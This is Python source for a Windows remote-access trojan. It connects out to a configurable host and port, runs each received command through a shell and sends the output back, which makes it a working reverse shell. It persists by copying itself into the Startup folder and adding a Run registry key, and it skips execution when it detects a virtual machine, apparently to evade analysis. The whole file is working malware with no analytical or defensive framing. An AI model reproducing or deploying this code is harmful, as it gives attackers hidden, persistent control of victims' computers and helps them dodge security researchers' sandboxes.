import socket
import time
import subprocess
import threading
import os
import sys
import winreg as reg
import ctypes as c


class Trojan:
    try:
        import compiler_config as comp

        HOST = comp.HOST
        PORT = comp.PORT
        ACTIVATE = comp.ACTIVATE
        PERSIST = comp.PERSIST
        ADMIN = comp.ADMIN
        DETECT_VM = comp.DETECT_VM
    except (ImportError, AttributeError) as e:
        HOST = "127.0.0.1"
        PORT = 469
        ACTIVATE = True
        PERSIST = False
        ADMIN = False
        DETECT_VM = False
        # c.windll.user32.MessageBoxW(0, str(e), "err")

    def __init__(self, host=HOST, port=PORT, activate=ACTIVATE, persist=PERSIST, admin=ADMIN, try_detect_vm=DETECT_VM):
        self.client = None
        self.is_vm = False
        self.host = host
        self.port = port
        self.activate = activate
        self.persist = persist
        self.admin = admin
        self.try_detect_vm = try_detect_vm
        self.filename = os.path.basename(sys.argv[0])

        if self.try_detect_vm:
            self.detect_vm()

    def autorun(self):
        try:
            os.system(f"copy {self.filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")
        except Exception as e:
            print(e)

        if self.admin:
            try:
                path = os.path.dirname(os.path.realpath(self.filename))
                name = self.filename
                address = os.path.join(path, name)

                key = reg.HKEY_CURRENT_USER
                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

                with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as register:
                    reg.SetValue(register, "Any", reg.REG_SZ, address)
                    register.Close()

            except (PermissionError, WindowsError, OSError):
                print("Permission denied")

    def detect_vm(self):
        self.is_vm = False
        if self.try_detect_vm:
            vm_vendors = ["VMware", "VirtualBox", "Virtual", "Microsoft Corporation", "Hyper-V", "QEMU", "KVM"]
            output = subprocess.check_output("wmic baseboard get product").decode().lower()
            print(output)

            for vendor in vm_vendors:
                if vendor.lower() in output:
                    self.is_vm = True

    def connect(self):
        # try:
        #     ip = socket.gethostbyname(host)
        # except Exception as e:
        #     ip = socket.gethostbyaddr(host)
        #     print(e)
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.host, self.port))
            self.client = client
        except Exception as error:
            print("error connect", error)
            self.client = None

    def listen(self):
        try:
            while True:
                data = self.client.recv(1024).decode().strip()
                print(data)
                if data == "/exit":
                    self.client.close()
                    break
                elif data == "/print":
                    pass
                else:
                    t = threading.Thread(target=self.cmd, args=(data,))
                    t.start()
                    t.join()
        except Exception as error:
            print("Error listen", error)
            if self.client:
                self.client.close()

    def cmd(self, data):
        try:
            # noinspection SubprocessShellMode
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            if output != b'':
                self.client.send(output)
        except Exception as error:
            print("error cmd", error)

    def run(self):
        if not self.is_vm:
            if self.persist:
                self.autorun()
            time.sleep(2)

            while self.activate:
                self.connect()
                if self.client:
                    self.listen()
                else:
                    time.sleep(3)


if __name__ == "__main__":
    trojan = Trojan()

    c.windll.user32.MessageBoxW(0, f"HOST: {trojan.HOST}, PORT: {trojan.PORT}, ACTIVATE: {trojan.ACTIVATE}, PERSIST: {trojan.PERSIST}, ADMIN: {trojan.ADMIN}, DETECT_VM: {trojan.DETECT_VM}, is_vm: {trojan.is_vm}", "types")

    trojan.run()
